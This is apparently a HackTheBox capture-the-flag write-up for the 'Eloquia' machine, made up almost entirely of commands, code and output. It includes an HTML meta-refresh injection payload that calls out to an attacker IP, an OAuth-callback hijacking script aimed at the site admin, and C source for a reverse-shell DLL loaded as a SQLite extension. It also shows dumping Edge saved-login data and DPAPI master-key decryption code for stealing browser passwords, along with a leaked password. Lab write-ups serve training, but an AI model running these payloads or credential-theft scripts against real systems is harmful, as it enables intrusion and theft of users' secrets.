---
tags:
title: Eloquia - Insane (HTB)
permalink: /Eloquia-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
zs1n@kali ~> nmapf 10.129.9.123
Nmap Full scan in progress
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-04 11:14 -0500
Initiating Ping Scan at 11:14
Scanning 10.129.9.123 [4 ports]
Completed Ping Scan at 11:14, 0.23s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:14
Completed Parallel DNS resolution of 1 host. at 11:14, 0.50s elapsed
Initiating SYN Stealth Scan at 11:14
Scanning 10.129.9.123 [65535 ports]
Discovered open port 80/tcp on 10.129.9.123
Discovered open port 5985/tcp on 10.129.9.123
Completed SYN Stealth Scan at 11:14, 13.94s elapsed (65535 total ports)
Nmap scan report for 10.129.9.123
Host is up, received echo-reply ttl 127 (0.25s latency).
Scanned at 2026-03-04 11:14:34 EST for 14s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
80/tcp   open  http    syn-ack ttl 127
5985/tcp open  wsman   syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.77 seconds
           Raw packets sent: 131081 (5.768MB) | Rcvd: 15 (856B)
-e [*] IP: 10.129.9.123
[*] Puertos abiertos: 80,5985
/usr/bin/xclip
-e [*] Service scanning with nmap against 80,5985 Ports..
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-04 11:14 -0500
Nmap scan report for eloquia.htb (10.129.9.123)
Host is up (0.32s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
|_http-title: Eloquia
|_http-server-header: Microsoft-IIS/10.0
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.08 seconds
```
## Website 

![[Pasted image 20260304131535.png]]

![[Pasted image 20260304133436.png]]

![[Pasted image 20260304133518.png]]

![[Pasted image 20260304133633.png]]

![[Pasted image 20260304134816.png]]

![[Pasted image 20260304140348.png]]

![[Pasted image 20260304140748.png]]

```bash
{{"<meta http-equiv=refresh content=0;url=http://10.10.16.221:8000/?c="+document.location+">"}}
```

![[Pasted image 20260304140814.png]]

![[Pasted image 20260304140911.png]]

```bash
zs1n@kali ~> python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.16.221 - - [04/Mar/2026 12:08:59] "GET /?c=%22+document.location+%22 HTTP/1.1" 200 -
10.10.16.221 - - [04/Mar/2026 12:08:59] code 404, message File not found
10.10.16.221 - - [04/Mar/2026 12:08:59] "GET /favicon.ico HTTP/1.1" 404 -
```

![[Pasted image 20260304141659.png]]

```bash
http://qooqle.htb/oauth2/authorize/?client_id=riQBUyAa4UZT3Y1z1HUf3LY7Idyu8zgWaBj4zHIi&response_type=code&redirect_uri=http://eloquia.htb/accounts/oauth2/qooqle/callback/
```

![[Pasted image 20260304192843.png]]

![[Pasted image 20260304192859.png]]

![[Pasted image 20260304192918.png]]

```python
import re, requests
from http.server import BaseHTTPRequestHandler, HTTPServer
import requests

LISTENER_IP = "10.10.16.221"
LISTENER_PORT = 1337
SESSION_ID = "lner05cvh22vq25xi1eyw3fme9uq96bh"
CSRFTOKEN = "GMbfDGVTiB4ojsAZq7xH2HewkenOIECr"


# ok this one fills up automatically
COOKIES = {
    "csrftoken":CSRFTOKEN,
    "sessionid":SESSION_ID,
    "schema_sidebar_open":"false"
}

#for troubleshooting?
PROXIES = {
    "http":"http://127.0.0.1:8080",
    "https":"https://127.0.0.1:8080"
}

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/test.html':
            print("Admin was connected..")
            code = input("Enter a callback code: ")
            self.send_response(302)
            self.send_header('Location', f'http://eloquia.htb/accounts/oauth2/qooqle/callback/?code={code}')
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

def get_csrf(body):
    match = re.search(r'(?<=value=")\w{64}(?=">)', body)
    if match:
        return match.group(0)
    raise ValueError("[-] CSRF token not found!")

def poison_article():
    ARTICLE_URL = "http://eloquia.htb/article/create/"
    r = requests.get(ARTICLE_URL, cookies=COOKIES, proxies=PROXIES)
    title = "NICE ARTICLE"
    # payload : {{"<meta http-equiv=refresh content=0;url=http://10.10.16.221:8000/?c="+document.location+">"}} o tambien <p><meta http-equiv="refresh" content="0; url=http://10.10.16.221:1337/bait.html"></p> usado en este caso
    csrf_token = get_csrf(r.text)
    payload = f"&lt;p&gt;&lt;meta http-equiv = \"refresh\" content = \"0; url=http://{LISTENER_IP}:{LISTENER_PORT}/bait.html\" &gt;&lt;/p&gt;"
    banner = None
    data = {
        "title": title,
        "csrfmiddlewaretoken": csrf_token,
        "content": payload,
    }
	
    with open("eloquia.PNG", "rb") as f:
        banner = {"banner": ("image.png", f.read(), "image/png")}

    r = requests.post(ARTICLE_URL, data=data, files=banner, allow_redirects=False, cookies=COOKIES, proxies=PROXIES)

    loc_header = r.headers["Location"]
    article_id = loc_header.strip('/').split('/')[-1]
    print("CSRF Article created with id: ", article_id)
    return article_id

def report_article(id):
    REPORT_URL = f"http://eloquia.htb/article/report/{id}/"
    r = requests.get(REPORT_URL, cookies=COOKIES, proxies=PROXIES, allow_redirects=False)

    if r.status_code == 302:
        print(f"Article with id {id} was reported\n")


print("Malicious article in progress..")

report_id = poison_article()

report_article(report_id)

print("Wait for admin..\n")
HTTPServer(('', LISTEN_PORT), Handler).serve_forever()
```


```bash
zs1n@kali ~> python3 oauth.py
Malicious article in progress..

CSRF Article created:  20
Article with id 20 was reported

Wait for admin..

Admin was connected..

Enter a callback code: mOxrsrILBS4Qw70PaDr0V6si3YTr7z
10.129.9.154 - - [04/Mar/2026 17:27:04] "GET /bait.html HTTP/1.1" 302 -
```

![[Pasted image 20260304193051.png]]

![[Pasted image 20260304192816.png]]


MyEl0qu!@Admin
![[Pasted image 20260304142519.png]]

![[Pasted image 20260304143020.png]]\\

```bash
zs1n@kali ~> msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.221 LPORT=4444 -f dll -o rev.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 9216 bytes
Saved as: rev.dll
```

```C#
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>

#pragma comment(lib, "Ws2_32.lib")

// Función de entrada para extensiones de SQLite
__declspec(dllexport) int sqlite3_extension_init(
    void *db,          // Corregido: puntero void
    char **pzErrMsg,
    void *pApi         // Corregido: puntero void
){
    WSADATA wsaData;
    SOCKET s;
    struct sockaddr_in sa;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    // Inicializar Winsock
    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
        return 1;
    }

    // Crear el Socket
    s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (s == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr("10.10.16.221"); // Tu IP de tun0
    sa.sin_port = htons(4444);                      // Tu puerto de escucha

    // Intentar conectar
    if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) == 0) {
        // Limpiar las estructuras de proceso
        SecureZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        
        // Redirigir entrada, salida y error estándar al socket
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;

        // Lanzar el shell (cmd.exe)
        // El parámetro TRUE permite que los handles (el socket) se hereden
        if (CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
            WaitForSingleObject(pi.hProcess, INFINITE);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }

    closesocket(s);
    WSACleanup();

    return 0; // SQLITE_OK
}
```

```bash
x86_64-w64-mingw32-gcc revshell.c -shared -o exploit.dll -lws2_32
```

![[Pasted image 20260304143050.png]]

![[Pasted image 20260304143133.png]]

![[Pasted image 20260304143225.png]]

![[Pasted image 20260304143256.png]]

![[Pasted image 20260304143318.png]]

![[Pasted image 20260304143946.png]]

```powershell
zs1n@kali ~> rlwrap sudo nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.16.221] from (UNKNOWN) [10.129.9.123] 50340
Microsoft Windows [Version 10.0.17763.8027]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Web\Eloquia>whoami

                     rlwrap: warning: rlwrap appears to do nothing for sudo, which asks for
                                                                                           single keypresses all the time. Don't you need --always-readline
                                                                                                                                                           and possibly --no-children? (cf. the rlwrap manpage)

                                    warnings can be silenced by the --no-warnings (-n) option

whoami
eloquia\web

C:\Web\Eloquia>whoami
whoami
eloquia\web
c:\Users\web\Desktop>type user.txt
type user.txt
5a823082295d43f7cf0f7317e22b0d86
```

```powershell
C:\Users\web\AppData\Local\Microsoft\Edge\User Data\Default>type "Login Data"
type "Login Data"
SQLite format @  .v���
.v���
y����y&Qlogins_edge_extended_table_version3Cedge_breached_table_version3;last_compatible_version40
                                                                                                  ersion41#mmap_status&Qlogins_edge_extended_table_version3Cedge_breached_table_version3;last_compatible_version40
                                       ersion41#mmap_status-1
����&Qlogins_edge_extended_table_versionCedge_breached_table_versionlast_compatible_version
                                                                                           ersion#	mmap_st&Qlogins_edge_extended_table_versionCedge_breached_table_versionlast_compatible_version
LT�4T<5                    ersion#	mmap_status
Lttps://chatgpt.com/olivia.katv10;'@ct��~�{�B-�I]�tK�QQCQbDW���k*https://chatgpt.com//�Z!xnull/�Z!xh:3
Lttps://openai.com/olivia.katv10*y#/H�±=�+�&���\[�	n^rd���#��쩺%Ԋ!bhttps://openai.com//u"!Lnull/u"!L�d05
tF�L��g�https://eloquia.htb//�HIsnull/�HIs� QQ!n:�
�o)l.��pisY6��M���~��n/unts/login/http://eloquia.htb/accounts/login/usernameOlivia.KATpasswordv10
LFhttp://eloquia.htb//�H8��"http://eloquia.htb/accounts/login/"http://eloquia.htb/accounts/login/	usernametext����'	passworpassword����null/�H8)|-/<5
Lttps://chatgpt.com/olivia.katv10;'@ct��~�{�B-�I]�tK�QQCQbDW���k*https://chatgpt.com//�Z!xnull/�Z!xh:3
Lttps://openai.com/olivia.katv10*y#/H�±=�+�&���\[�	n^rd���#��쩺%Ԋ!bhttps://openai.com//u"!Lnull/u"!L�d05
tF�L��g�https://eloquia.htb//�HIsnull/�HIs� QQ!n:�
�o)l.��pisY6��M���~��n/unts/login/http://eloquia.htb/accounts/login/usernameOlivia.KATpasswordv10
SFhttp://eloquia.htb//�H8��"http://eloquia.htb/accounts/login/"http://eloquia.htb/accounts/login/	usernametext����'	passworpassword����null/�H8)|-/�H8���
����ps://eloquia.htb/testhttps://eloquia.htb/t.com/45livia.KATpasswordhttp://eloquia.htb/83
logins
5logins_edge_extended
����
logins
5logins_edge_extended
5https://chatgpt.com/3http://eloquia.htb/3https://openai.com/5https://eloquia.htb/htb/

�g�b:�t++'99itablesync_entities_metadatasync_entities_metadatCREATE TABLE sync_entities_metadata (storage_key INTEGER PRIMARY KEY AUTOINCREMENT, metadata VARCHAR NOT NULL)R'sindexlogins_signonloginsCREATE INDEX logins_signon ON logins (signon_realm)P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)UtableloginsloginsCREATE TABLE logins (origin_url VARCHAR NOT NULL, action_url VARCHAR, username_element VARCHAR, username_value VARCHAR, password_element VARCHAR, password_value BLOB, submit_element VARCHAR, signon_realm VARCHAR NOT NULL, date_created INTEGER NOT NULL, blacklisted_by_user INTEGER NOT NULL, scheme INTEGER NOT NULL, password_type INTEGER, times_used INTEGER, form_data BLOB, display_name VARCHAR, icon_url VARCHAR, federation_url VARCHAR, skip_zero_click INTEGER, generation_upload_status INTEGER, possible_username_pairs BLOB, id INTEGER PRIMARY KEY AUTOINCREMENT, date_last_used INTEGER NOT NULL DEFAULT 0, moving_blocked_for BLOB, date_password_modified INTEGER NOT NULL DEFAULT 0, sender_email VARCHAR, sender_name VARCHAR, date_received INTEGER, sharing_notification_displayed INTEGER NOT NULL DEFAULT 0, keychain_identifier BLOB, sender_profile_image_url VARCHAR, UNIQUE (origin_url, username_element, username_value, password_element, signon_realm))+?indexsqlite_autoindex_logins_1loginsf/tablemetametaCREATE TABLE meb\(key LONGVARCHAR NOT NULL UNIQUE PRIMARY KEY, value LONGVARCHAR)';indexsqlite_autoindex_meta_1meta
Xce::gin_url, username_element, username_value, password_element, signon_realm))+?indexsqlite_autoindex_logins_1loginsf/tablemetametaCREATE TABLE meta(key LONGVARCHAR NOT b\LL UNIQUE PRIMARY KEY, value LONGVARCHAR)';indexsqlite_autoindex_meta_1meta
Xce::t;)indexforeign_key_index_notespassword_notesCREATE INDEX foreign_key_index_notes ON password_notes (parent_id)K
                                                                                                                     ))Qtablepassword_notespassword_notesCREATE TABLE password_notes (id INTEGER PRIMARY KEY AUTOINCREMENT, parent_id INTEGER NOT NULL REFERENCES logins ON UPDATE CASCADE ON DELETE CASCADE DEFERRABLE INITIALLY DEFERRED, key VARCHAO)indexsqlite_autoindex_password_notes_1password_notestconfidential INTEGER, UNIQUE (parent_id, key));
                                                       /5indexforeign_key_indexinsecure_credentialsCREATE INDEX foreign_key_index ON insecure_credentials (parent_id)G
[5indexsqlite_autoindex_insecure_credentials_1insecure_credentials
                                                                  	55/tableinsecure_credentialsinsecure_credentials
CREATE TABLE insecure_credentials (parent_id INTEGER REFERENCES logins ON UPDATE CASCADE ON DELETE CASCADE DEFERRABLE INITIALLY DEFERRED, insecurity_type INTEGER NOT NULL, create_time INTEGER NOT NULL, is_muted INTEGER NOT NULL DEFAULT 0, trigger_notification_from_backend INTEGER NOT NULL DEFAULT 0, UNIQUE (parent_id, insecurity_type))3]tablesync_model_metadatasync_model_metadata	CREATE TABLE sync_model_metadata (id INTEGER PRIMARY KEY AUTOINCREMENT, model_metadata VARCHAR NOT NULL)
security_type))3]tablesync_model_metadatasync_model_metadata	CREATE TABLE sync_model_metadata (id INTEGER PRIMARY KEY AUTOINCREMENT, model_metadata VARCHAR NOT NULL)




http://eloquia.htb/accounts/login/Olivia.KAT
j�j�#5!https://chatgpt.com/olivia.kat"3!https://openai.com/olivia.kat5https://eloquia.htb/test0Q!	http://el#5!https://chatgpt.com/olivia.kat"3!https://openai.com/olivia.kat5https://eloquia.htb/test0Q!	http://eloquia.htb/accounts/login/Olivia.KAT
0����#5!0ttps://chatgpt.com/olivia.kat"3!https://openai.com/olivia.kat5https://eloquia.htb/test0Q!	http://eloquia.htb/accounts/login/Olivia.KAT

���EO$�N%oindexstats_originstatsCREATE INDEX stats_origin ON stats(origin_domain))=indexsqlite_autoindex_stats_1stats@_tablestatsstatsCREATE TABLE stats (origin_domain VAR���EO$�N%oindexstats_originstatsCREATE INDEX stats_origin ON stats(origin_domain))=indexsqlite_autoindex_stats_1stats@_tablestatsstatsCREATE TABLE stats (origin_domain VARCHAR NOT NULL, username_value VARCHAR, dismissal_count INTEGER, update_time INTEGER NOT NULL, UNIQUE(origin_domain, username_value))055tablelogins_edge_extendedlogins_edge_extendedCREATE TABLE logins_edge_extended (id INTEGER PRIMARY KEY AUTOINCREMENT, source VARCHAR NOT null DEFAULT 0, strength_alert_status INTEGER NOT null DEFAULT 0, password_nickname VARCHAR NOT null DEFAULT '' , password_category INTEGER NOT null DEFAULT 0)f5indexbreached_table_indexbreachedCREATE INDEX breached_table_index ON breached (url, username)/Cindexsqlite_autoindex_breached_1breachedtablebreachedbreachedCREATE TABLE breached (url VARCHAR NOT null, username VARCHAR NOT null, status INTEGER NOT null, alert_state INTEGER NOT null, last_checked_time INTEGER NOT null, sanitized_username VARCHAR, alert_seen INTEGER, last_seen_time INTEGER, UNIQUE (url, username))

C:\Users\web\AppData\Local\Microsoft\Edge\User Data\Default>
```

```powershell
C:\Users\web\AppData\Local\Microsoft\Edge\User Data>type "local state"
type "local state"
{"accessibility":{"captions":{"common_models_path":"","soda_binary_path":""}},"breadcrumbs":{"enabled":false,"enabled_time":"13405555428122354"},"browser":{"browser_build_version":"124.0.2478.51","browser_version_of_last_seen_whats_new":"124.0.2478.51","last_seen_whats_new_page_version":"124.0.2478.51"},"cloned_install":{"count":1,"first_timestamp":"1761082237","last_timestamp":"1761082237"},"continuous_migration":{"local_guid":"79b80a6d-92b2-4291-bfbf-52a74d3a4ff4"},"desktop_session_duration_tracker":{"last_session_end_timestamp":"1761159285"},"dual_engine":{"consumer_mode":{"ie_usage_checked":"13405555488648607","ie_usage_times":[]}},"edge":{"manageability":{"edge_last_active_time":"13405632885002919"},"mitigation_manager":{"renderer_app_container_compatible_count":1,"renderer_code_integrity_compatible_count":1},"perf_center":{"efficiency_mode_v2_is_active":false,"performance_mode":3,"performance_mode_is_on":false},"tab_stabs":{"closed_without_unfreeze_never_unfrozen":0,"closed_without_unfreeze_previously_unfrozen":0,"discard_without_unfreeze_never_unfrozen":0,"discard_without_unfreeze_previously_unfrozen":0},"tab_stats":{"frozen_daily":0,"unfrozen_daily":0}},"edge_autolaunch":{"not_activation_reason":2},"edge_ci":{"metrics_bookmark":"\u003CBookmarkList>\r\n\u003C/BookmarkList>","num_healthy_browsers_since_failure":4},"edge_rewards_usage_clock":{"last_log_timestamp":"1761082891"},"fre":{"has_first_visible_browser_session_completed":true,"has_user_committed_selection_to_import_during_fre":false,"has_user_completed_fre":false,"has_user_seen_fre":true,"last_seen_fre":"124.0.2478.51","oem_bookmarks_set":true},"hardware_acceleration_mode_previous":true,"is_dsp_recommended":true,"last_pin_migration_on_edge_version":"124.0.2478.80","last_pin_migration_on_os_version":"10 Version 1809 (Build 17763.7919)","legacy":{"profile":{"name":{"migrated":true}}},"local":{"password_hash_data_list":[]},"new_device_experimentation":{"disable_popups_feature_checked":3,"disable_popups_first_interaction_time":"13405555428724191","disable_popups_treatment_applied":false,"ntp_feed_below_the_fold_feature_checked":3,"ntp_feed_below_the_fold_treatment_applied":false,"reduced_ntp_ads_feature_checked":3,"reduced_ntp_ads_treatment_applied":false},"new_device_fre":{"has_user_completed_new_device_modal_fre":true,"has_user_seen_new_fre":true,"seen_time":"13358113872917179"},"optimization_guide":{"model_store_metadata":{}},"os_crypt":{"app_bound_fixed_data2":"AQAAANCMnd8BFdERjHoAwE/Cl+sBAAAA+5eGXjaYfU+j6O4GOpKYZAAAAAACAAAAAAAQZgAAAAEAACAAAADvZ5iE66LlE0A5ew6r40cuOLoSLUCSjRfCzhvKM0jwPQAAAAAOgAAAAAIAACAAAACSEciOnI04W46Xy9iGQZrQyJhAwp5XeclmgPS4bcsGeGABAADQudWGq+pmtynLKUT7LZ+/nG7jCY11fXuZ51UnovXG8yG40wF6aq+EJzjyELuOX9k2nSTul8dyOWlDeqs4gx+6uAM54l48NzcKLnZl6o57IkaS9eajqjcuJcHq6jRzO/NXGQP27R71cmE+KmUbPIfyk6nWimF7jZZJDmOV7zeecRXt7CuN9fsIiGq4rfQccfMWM3EfM7pcbDITIrOL9hmGoZif+BwQyjbgahpJ6Oop3Rz7Qesh4Mgp9vQDD39xxmqx8QTFaGX2qDj6DXknCxJcIhKPxOpOoSx1jT8Hn0AVnRKmqZXwa6SLNDYuJ80+kMpWz6n2yiuVAq/oNpxYnQNGMVicC/1QulsPKAU5fSbJAI+PjUUVYyNxcsgdgdoXKdIFr7LibQgW07AZsKe7BuqAoHZCOL690/lVCR05qJl2EQMe6mzw4SJPZQ/V7cy8QFpzBVe/EfREiPNa0RV82HFWQAAAAELykgbR2gu8Ej9eUmoo4kTC0ChR7uJKP9QMuyt5Jr8OivLQZRjPenRaZ8KK0Pjbgyk5hgijDWotced3aq9kteg=","audit_enabled":true,"encrypted_key":"RFBBUEkBAAAA0Iyd3wEV0RGMegDAT8KX6wEAAABzr42Q+SDgR78a6A6x6z+EEAAAAB4AAABNAGkAYwByAG8AcwBvAGYAdAAgAEUAZABnAGUAAAAQZgAAAAEAACAAAABZqUTKi+3PgIqd3Qa3HRY2/JCmSDJLECa+TMtiB0cTPAAAAAAOgAAAAAIAACAAAAB0hEH7C3oQN6ghOwRl2cHGV2G3/o/oobqZ3Zm0uQNUhjAAAAAWtJnWT3GsY2PXsMOl66xYaMIXJodfrvLK5HVzFOvcGuw1CJn8xvbLF0LLyaOLujdAAAAA+vRmKffc2JdtiXx3o7Pvxy5CiU8YAuklDgNkgE+eAFDiAhBb5ZWr7zp30+GtPk4qluAXDrum+QHtuygfoywpTw=="},"password_manager":{"os_password_blank":false,"os_password_last_changed":"13405377913042620"},"policy":{"last_statistics_update":"13405555428121335"},"
```

```powershell
certutil -encode "Local State" enc.txt
certutil -encode "Login Data" enc2.txt
```

```bash
zs1n@kali ~> grep -v "\-\-\-\-\-" enc.txt | base64 -d > "LocalState"
zs1n@kali ~> grep -v "\-\-\-\-\-" enc2.txt | base64 -d > "Login Data"
```
```powershell
PS C:\temp> Add-Type -AssemblyName System.Security
>> $path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
>> $ls = Get-Content -Raw -Path $path | ConvertFrom-Json
>> $ek = [Convert]::FromBase64String($ls.os_crypt.encrypted_key)[5..($ls.os_crypt.encrypted_key.Length - 1)]
>> $mk = [System.Security.Cryptography.ProtectedData]::Unprotect($ek, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
>> $key = [BitConverter]::ToString($mk).Replace("-", "")
>> Write-Host "MASTER KEY: $key"
MASTER KEY: 53ACC919013C10D9783C3EF45BE4602D86B95778E7A3C44F08790F0DA3DD28AA
```

```powershell
where /r C:\Windows\Microsoft.NET InstallUtil.exe
```

```powershell
C:\Web\Eloquia\static\assets\images\blog>echo using System;using System.ComponentModel;using System.Configuration.Install;using System.Security.Cryptography;using System.IO;public class RemoteDecrypt : Installer { public override void Install(System.Collections.IDictionary stateSaver) { try { string b64 = "AQAAANCMnd8BFdERjHoAwE/Cl+sBAAAA+5eGXjaYfU+j6O4GOpKYZAAAAAACAAAAAAAQZgAAAAEAACAAAADvZ5iE66LlE0A5ew6r40cuOLoSLUCSjRfCzhvKM0jwPQAAAAAOgAAAAAIAACAAAACSEciOnI04W46Xy9iGQZrQyJhAwp5XeclmgPS4bcsGeGABAADQudWGq+pmtynLKUT7LZ+/nG7jCY11fXuZ51UnovXG8yG40wF6aq+EJzjyELuOX9k2nSTul8dyOWlDeqs4gx+6uAM54l48NzcKLnZl6o57IkaS9eajqjcuJcHq6jRzO/NXGQP27R71cmE+KmUbPIfyk6nWimF7jZZJDmOV7zeecRXt7CuN9fsIiGq4rfQccfMWM3EfM7pcbDITIrOL9hmGoZif+BwQyjbgahpJ6Oop3Rz7Qesh4Mgp9vQDD39xxmqx8QTFaGX2qDj6DXknCxJcIhKPxOpOoSx1jT8Hn0AVnRKmqZXwa6SLNDYuJ80+kMpWz6n2yiuVAq/oNpxYnQNGMVicC/1QulsPKAU5fSbJAI+PjUUVYyNxcsgdgdoXKdIFr7LibQgW07AZsKe7BuqAoHZCOL690/lVCR05qJl2EQMe6mzw4SJPZQ/V7cy8QFpzBVe/EfREiPNa0RV82HFWQAAAAELykgbR2gu8Ej9eUmoo4kTC0ChR7uJKP9QMuyt5Jr8OivLQZRjPenRaZ8KK0Pjbgyk5hgijDWotced3aq9kteg="; byte[] mkB = Convert.FromBase64String(b64); byte[] trim = new byte[mkB.Length - 5]; Buffer.BlockCopy(mkB, 5, trim, 0, trim.Length); byte[] dec = ProtectedData.Unprotect(trim, null, DataProtectionScope.CurrentUser); string hex = BitConverter.ToString(dec).Replace("-", ""); Console.WriteLine("---RESULTADO---"); Console.WriteLine(hex); Console.WriteLine("----------------"); } catch (Exception ex) { Console.WriteLine("Error: " + ex.Message); } } } > Decrypt.cs
echo using System;using System.ComponentModel;using System.Configuration.Install;using System.Security.Cryptography;using System.IO;public class RemoteDecrypt : Installer { public override void Install(System.Collections.IDictionary stateSaver) { try { string b64 = "AQAAANCMnd8BFdERjHoAwE/Cl+sBAAAA+5eGXjaYfU+j6O4GOpKYZAAAAAACAAAAAAAQZgAAAAEAACAAAADvZ5iE66LlE0A5ew6r40cuOLoSLUCSjRfCzhvKM0jwPQAAAAAOgAAAAAIAACAAAACSEciOnI04W46Xy9iGQZrQyJhAwp5XeclmgPS4bcsGeGABAADQudWGq+pmtynLKUT7LZ+/nG7jCY11fXuZ51UnovXG8yG40wF6aq+EJzjyELuOX9k2nSTul8dyOWlDeqs4gx+6uAM54l48NzcKLnZl6o57IkaS9eajqjcuJcHq6jRzO/NXGQP27R71cmE+KmUbPIfyk6nWimF7jZZJDmOV7zeecRXt7CuN9fsIiGq4rfQccfMWM3EfM7pcbDITIrOL9hmGoZif+BwQyjbgahpJ6Oop3Rz7Qesh4Mgp9vQDD39xxmqx8QTFaGX2qDj6DXknCxJcIhKPxOpOoSx1jT8Hn0AVnRKmqZXwa6SLNDYuJ80+kMpWz6n2yiuVAq/oNpxYnQNGMVicC/1QulsPKAU5fSbJAI+PjUUVYyNxcsgdgdoXKdIFr7LibQgW07AZsKe7BuqAoHZCOL690/lVCR05qJl2EQMe6mzw4SJPZQ/V7cy8QFpzBVe/EfREiPNa0RV82HFWQAAAAELykgbR2gu8Ej9eUmoo4kTC0ChR7uJKP9QMuyt5Jr8OivLQZRjPenRaZ8KK0Pjbgyk5hgijDWotced3aq9kteg="; byte[] mkB = Convert.FromBase64String(b64); byte[] trim = new byte[mkB.Length - 5]; Buffer.BlockCopy(mkB, 5, trim, 0, trim.Length); byte[] dec = ProtectedData.Unprotect(trim, null, DataProtectionScope.CurrentUser); string hex = BitConverter.ToString(dec).Replace("-", ""); Console.WriteLine("---RESULTADO---"); Console.WriteLine(hex); Console.WriteLine("----------------"); } catch (Exception ex) { Console.WriteLine("Error: " + ex.Message); } } } > Decrypt.cs

C:\Web\Eloquia\static\assets\images\blog>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library /out:Decrypt.dll Decrypt.cs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library /out:Decrypt.dll Decrypt.cs
Microsoft (R) Visual C# Compiler version 4.7.3190.0
for C# 5
Copyright (C) Microsoft Corporation. All rights reserved.

This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240


C:\Web\Eloquia\static\assets\images\blog>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 22C6-32BB

 Directory of C:\Web\Eloquia\static\assets\images\blog

03/04/2026  11:07 AM    <DIR>          .
03/04/2026  11:07 AM    <DIR>          ..
04/20/2024  02:18 AM            28,358 3.webp
04/20/2024  02:22 AM           113,381 4.png
04/20/2024  02:26 AM           178,150 5.jpg
04/20/2024  02:28 AM           234,826 6.jpg
04/20/2024  02:45 AM            89,701 7.jpg
03/05/2025  12:57 PM           143,919 8.jpg
03/04/2026  11:00 AM            79,314 b64_state.txt
11/06/2025  01:41 PM             9,569 blog-1.jpg
03/04/2026  11:07 AM             1,471 Decrypt.cs
03/04/2026  11:07 AM             5,632 Decrypt.dll
03/04/2026  10:51 AM             3,225 edge.py
03/04/2026  09:37 AM            92,674 exploit.dll
04/20/2024  02:12 AM            22,864 Job-offer-checklist.jpg.webp
03/04/2026  10:58 AM             1,221 key.aspx
03/09/2025  12:18 PM            36,914 main-banner.png
03/04/2026  08:41 AM            29,061 None.PNG
03/04/2026  09:05 AM            29,061 None_3eKtod1.PNG
03/04/2026  09:03 AM            29,061 None_3Evf2p1.PNG
03/04/2026  08:48 AM            29,061 None_EfXDPWc.PNG
03/04/2026  08:45 AM            29,061 None_fb9kiRA.PNG
03/04/2026  09:20 AM            29,061 None_IhRX4F6.PNG
03/04/2026  09:03 AM            29,061 None_RmqhjoJ.PNG
03/04/2026  09:08 AM            29,061 None_s1HO3jm.PNG
03/04/2026  08:52 AM            29,061 None_SchljRL.PNG
03/04/2026  09:07 AM            29,061 None_UGZwj51.PNG
03/04/2026  08:50 AM            29,061 None_ymcHhDC.PNG
03/04/2026  10:57 AM             9,216 rev.dll
              27 File(s)      1,370,106 bytes
               2 Dir(s)   5,277,024,256 bytes free
```

```powershell
echo import json, base64, win32crypt > get_key.py
echo with open(r"C:\Users\web\AppData\Local\Microsoft\Edge\User Data\Local State", "r") as f: >> get_key.py
echo     js = json.loads(f.read()) >> get_key.py
echo ek = base64.b64decode(js["os_crypt"]["encrypted_key"])[5:] >> get_key.py
echo mk = win32crypt.CryptUnprotectData(ek, None, None, None, 0)[1] >> get_key.py
echo print("MASTER_KEY:" + mk.hex()) >> get_key.py


..snip..





C:\Web\Eloquia\static\assets\images\blog>echo import json, base64, win32crypt > get_key.py
echo with open(r"C:\Users\web\AppData\Local\Microsoft\Edge\User Data\Local State", "r") as f: >> get_key.py
echo     js = json.loads(f.read()) >> get_key.py
echo ek = base64.b64decode(js["os_crypt"]["encrypted_key"])[5:] >> get_key.py
echo mk = win32crypt.CryptUnprotectData(ek, None, None, None, 0)[1] >> get_key.py
echo print("MASTER_KEY:" + mk.hex()) >> get_key.py
echo import json, base64, win32crypt > get_key.py

